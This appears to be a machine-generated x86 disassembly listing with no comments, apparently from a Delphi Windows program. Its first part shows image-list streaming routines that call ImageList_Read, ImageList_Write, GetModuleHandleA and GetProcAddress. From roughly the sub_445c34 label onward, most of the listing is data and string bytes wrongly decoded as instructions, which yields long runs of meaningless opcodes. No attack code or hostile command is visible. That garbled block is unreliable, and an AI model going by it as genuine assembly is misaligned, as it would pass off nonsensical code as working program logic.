mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4453a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41662c
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41664c
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_445383
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_422334
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412d08
mov eax [ ebp - 0x4 ]
call sub_445748
xor eax eax
push ebp
push sub_445366
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44536d
mov eax [ ebp - 0xc ]
call sub_403294
mov eax [ ebp - 0x14 ]
call sub_403294
mov eax [ ebp - 0x4 ]
call sub_44574c
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412d30
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4215c4
push eax
mov eax [ ebp - 0xc ]
call sub_4215c4
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41e3f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412d30
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4215c4
push eax
mov eax [ ebp - 0x14 ]
call sub_4215c4
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41e3f4
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_444688
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4453b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b43c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445410
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_444520
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445417
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub eax 0xffffffec
sub_445417
mov eax [ ebp - 0x4 ]
call sub_444410
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_445546
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41664c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_416d54
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41664c
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403294
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41664c
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b43c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445529
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41664c
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_444520
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41664c
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_445578
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_4445b0
mov eax edi
call sub_41662c
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41664c
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44511c
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4453b0
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_445604
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b43c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4456fe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bde0
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44454c
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44454c
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445705
mov eax [ ebp - 0x4 ]
call sub_403294
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
jmp r-xdata
sub_44576c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
mov edx esi
call sub_444edc
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4457b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4457dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4457e4
retn
sub_445c34
clc
push edx
push ecx
call [ edi + edx * 4 ]
inc esp
add [ ecx + edx * 4 ] dl
inc esp
add ah ah
xchg ecx eax
inc esp
add [ edx + edx * 4 ] bl
inc esp
add [ esi + edx * 4 - 0x698fffbc ] al
inc esp
add [ eax - 0x71 ] dh
inc esp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x346b6365
pop edx
inc esp
add [ ebx ] bh
add [ eax ] al
jmp [ ecx + 0x10044 ]
arpl [ ebx + 0x34 ] bp
insd
pop esp
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
dec [ eax - 0x70 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
hlt
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
insd
enter 0x445b 0x0
add al 0x2b
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
outsb
jne r-xdata
imul ebp [ eax + edx + 0x300040 ] 0x0
inc [ edi + ecx * 4 - 0x67a7ffbc ]
popad
jns r-xdata
adc [ eax ] al
cmp eax 0xe8ff0000
xchg esi eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x4c6d6574
adc eax 0x600041
add bh bh
push eax
xchg ecx eax
inc esp
add [ eax ] bl
cdq
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp - 0x6efbffbf ] dl
inc esp
add [ eax + 0x1004495 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
insb
adc [ eax ] al
aas
add [ eax ] al
inc eax
nop
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
popad
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
test [ edi - 0x67a7ffbc ] cl
xor al 0x5a
inc esp
add [ eax + eax ] bh
add bh bh
and [ ebx + 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x75411100
je r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
jne r-xdata
adc al 0x41
add [ eax + eax ] dl
call [ eax + eax ]
adc [ eax ] al
cmp al [ eax ]
add bh bh
cmp al 0x92
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
push esp
pop [ eax + eax + 0x78 ]
cwde
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
xor al 0x42
inc esp
add [ eax + eax ] bh
inc [ edx + ebx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44584870
add [ eax ] cl
add bh bh
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
ror dl 0x1
inc ecx
add [ eax - 0x6b ] bh
inc esp
add [ eax ] dl
xchg esi eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
inc ecx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
jmp [ ecx + edx * 4 + 0x44 ]
js r-xdata
je r-xdata
add [ eax ] al
or eax 0x72470a00
outsd
add [ eax ] al
dec ebp
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
ja r-xdata
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
sbb [ ecx + 0x44 ] bl
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
mov eax 0x4498
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
push [ ecx + edx * 4 + 0x44 ]
add al bh
cwde
inc esp
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc esp
add [ eax + 0x4498 ] bl
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
dec eax
nop
add [ edx ] bh
pushad
inc esp
add [ esi + 0x60 ] cl
inc esp
add [ eax ] bl
add [ eax ] al
or [ edx ] ch
je r-xdata
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esp ] ah
inc esp
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ esp + ebp * 4 + 0x44 ] cl
add al ch
lodsb [ esi ]
insd
les ebx [ ecx + 0x44 ]
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
jae r-xdata
add [ eax + 0x340044a3 ] cl
lodsb [ esi ]
inc esp
add [ eax - 0x5c ] bh
inc esp
add [ esp + ebp * 4 + 0x44 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ch
add [ eax ] al
add eax [ eax ]
std
mov ah 0xad
inc ecx
add [ ebp + ebp * 4 - 0x4f2bffbf ] ch
inc ecx
jb r-xdata
inc esp
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
dec ecx
je r-xdata
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
lodsd [ esi ]
inc ecx
add [ esi + ebp * 4 - 0x4f33ffbf ] bl
inc ecx
insd
lea eax [ eax ]
in al dx
pop edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pushad
inc esp
add [ eax + 0x60 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_446235
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
je r-xdata
outsb
je r-xdata
hlt
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + 0x44 ] dh
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
pop eax
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
js r-xdata
mov eax 0x3004462
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
push 0x74754274
je r-xdata
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
jne r-xdata
clc
jo r-xdata
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ eax + edi * 4 + 0x44 ] bh
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ esp + ebp * 4 + 0x44 ] cl
add al ch
lodsb [ esi ]
inc esp
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
outsd
pushad
arpl [ eax + eax + 0x6 ] ax
je r-xdata
jne r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esp
add [ eax ] bh
add [ eax ] al
mov al [ 0xffffffffb400445f ]
mov al 0x41
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + 0x740d0044 ] dh
bound edx [ edx + 0x69 ]
add [ eax ] ch
mov cl 0x44
add [ eax ] bh
mov cl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
jae r-xdata
add eax 0x756e654d
outsb
add eax 0x756e654d
jae r-xdata
bound eax [ eax + eax + 0x3 ]
andps xmm1 [ ebp + 0x65 ]
outsb
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp esi
bound eax [ eax + eax - 0x73 ]
inc eax
add ah al
arpl [ eax + eax ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc esp
add [ eax ] al
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
push esp
outsd
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
inc eax
outsd
insd
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] cl
mov cl 0x44
add [ eax ] bl
mov cl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
dec eax
outsd
je r-xdata
add al dl
mov ah 0xb0
inc ecx
sbb [ esp + eax * 2 ] ah
pop es
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jo r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
jmp [ eax + esi * 4 + 0x10044 ]
xor al 0x42
inc esp
add [ eax ] cl
add bh bh
lodsb [ esi ]
lodsb [ esi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add ah al
mov eax 0xb8cc0044
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc esp
imul ecx [ ebp + 0x6f ] 0x14f86564
inc ecx
adc al 0x41
add [ eax ] dh
add [ eax ] al
call [ eax - 0x77ffbb50 ]
test eax 0x44
adc al 0x41
clc
jl r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
bound eax [ eax + eax + 0x68 ]
add [ eax ] al
[ eax ]
inc ecx
add ah al
je r-xdata
inc ebx
push 0x65676e61
adc eax 0x700041
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
arpl [ eax + eax + 0x69 ] ax
add [ eax ] al
[ ecx ]
add [ eax - 0x80000000 ] al
mov [ ecx + 0x44 ] ch
inc esp
inc ecx
add ah dl
mov al 0x41
add [ eax ] cl
mov eax 0xac340044
inc esp
add [ eax - 0x5c ] bh
inc esp
add [ esp + ebp * 4 + 0x44 ] ah
add [ eax + 0x680044b8 ] dh
mov ecx 0x540a0044
push eax
outsd
jo r-xdata
lodsd [ esi ]
arpl [ eax + eax + 0x54 ] ax
pushad
inc esp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
inc esp
je r-xdata
xor al 0x40
shr [ eax + 0x66 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x44 ] bh
add [ eax + eax ] dl
add [ eax ] al
call 0xffffffffc444a763
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
jo r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah dh
aas
inc ecx
add [ eax - 0x27ffbebf ] bl
inc ebx
inc ecx
add [ eax + 0x40 ] cl
inc ecx
add ah al
inc eax
inc ecx
add [ eax + 0xa0044b2 ] al
push esp
push eax
outsd
jo r-xdata
add al ch
sbb al [ ecx ]
les esi [ eax + eax * 2 ]
outsb
mov [ eax + 0x44 ] bl
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
jl r-xdata
add [ edx + 0x44 ] dh
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
dec eax
xor eax 0x35ac0042
inc edx
add [ ebp + esi + 0x35780042 ] cl
add [ eax ] cl
add [ eax ] al
add [ eax ] cl
xor al 0x42
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x35 ] cl
inc edx
add [ ebp + esi + 0x358c0042 ] ch
inc edx
add [ eax + 0x35 ] bh
imul esi [ ebx + 0x74 ] 0x4466d490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
inc sp
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc esp
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43b858
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_446313
bound eax [ eax + eax + 0xd ]
insd
popad
dec esp
je r-xdata
bound eax [ eax + eax - 0x73 ]
inc eax
add ah al
arpl [ eax + eax ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc esp
add [ eax ] al
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
add [ eax ] ch
